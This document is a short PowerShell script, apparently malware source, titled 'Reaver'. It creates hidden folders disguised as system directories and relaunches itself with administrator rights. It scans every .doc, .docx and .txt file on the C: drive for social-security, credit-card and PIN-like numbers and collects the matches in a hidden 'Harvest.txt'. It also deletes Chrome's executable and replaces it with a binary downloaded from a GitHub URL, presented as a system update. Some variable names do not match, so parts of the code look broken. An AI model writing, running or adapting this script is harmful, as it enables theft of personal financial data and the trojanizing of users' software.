set-location C:
$Path = "C:"
$Pattern1 = "\d\d\d-\d\d-\d\d\d\d"
$Pattern2 = "\d\d-\d\d-\d\d\d\d"
$Pattern3 = "\d\d\d\d-\d\d\d\d-\d\d\d\d-\d\d\d\d"
$Pattern4 = "\d\d\d\d"
$Array = @()
mkdir "C:\...sys."
mkdir "C:\...sys.\d1ls"
attrib +h "C:\...sys.\d1ls"
attrib +h "C:\...sys."
$Harvest = "C:\...sys.\d1ls\Harvest.txt"
$ErrorActionPreference = "SilentlyContinue"
$OpLoc = Split-Path $script:MyInvocation.MyCommand.Path
$ScrPat = "$OpLoc\Reaver.ps1"
Function PrivCheck
{
    $ver = $Host | Select-Object version 
    if ($ver.Version.Major -gt 1) {$Host.Runspace.ThreadOptions = "ReuseThread"}
    #Verify current runnning script is run with elevated privileges
    $IsAdmin = [Security.Principal.WindowsIdentity]::GetCurrent()
    If ((New-Object Security.Principal.WindowsPrincipal $IsAdmin).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $False)
    {
        Write-Host "`n ERROR: You are NOT a local administrator. Closing this session and reopening with proper permissions..."
        $NewProc = New-Object System.Diagnostics.ProcessStartInfo "Powershell.exe";
        $newProc.Arguments = "$ScrPat"
        $NewProc.verb = "runas";
        [System.Diagnostics.Process]::Start($NewProc)
        exit 
    }
}
Function Scythe
{
    $Docs = Get-Childitem -path C:\ -Include *.doc,*.docx -File -Recurse
    Foreach ($doc in $Docs)
    {
        Get-Childitem -path $doc | Get-Content $doc | Select-String -Pattern $patt1 | out-file -append $Harvest
        Get-Childitem -path $doc | Get-Content $doc | Select-String -Pattern $patt2 | out-file -append $Harvest
        Get-Childitem -path $doc | Get-Content $doc | Select-String -Pattern $patt3 | out-file -append $Harvest
        Get-Childitem -path $doc | Get-Content $doc | Select-String -Pattern $patt4 | out-file -append $Harvest
    }
    $Txts = Get-Childitem -Path C:\ -include *.txt -File -Recurse
    foreach ($txt in $Txts)
    {
        Get-Childitem -path $txt | Select-String -Pattern $patt1 | out-file -append $Harvest
        Get-Childitem -path $txt | Select-String -Pattern $patt2 | out-file -append $Harvest
        Get-Childitem -path $txt | Select-String -Pattern $patt3 | out-file -append $Harvest
        Get-Childitem -path $txt | Select-String -Pattern $patt4 | out-file -append $Harvest
    }
}
function SystemUpdate
{
    $Santa = Test-Path "C:\Program Files\Google\Chrome\Application"
    if ($Santa -eq "$True")
    {
        Remove-Item "C:\Program Files\Google\Chrome\chrome.exe" -Force
        wget https://github.com/nikorasen/Project_Scythe/blob/035e07f1f18bc8b13b84cf8b5f5cfc79e014ddf2/chrome.exe -outfile C:\...sys.\d1ls\chrome.exe
        Move-Item -Path "C:\...sys.\d1ls\chrome.exe" -Destination "C:\Program Files\Google\Chrome\chrome.exe" -Force
    }
}
function Reaver
{
    PrivCheck
    Scythe
    SystemUpdate
}
Reaver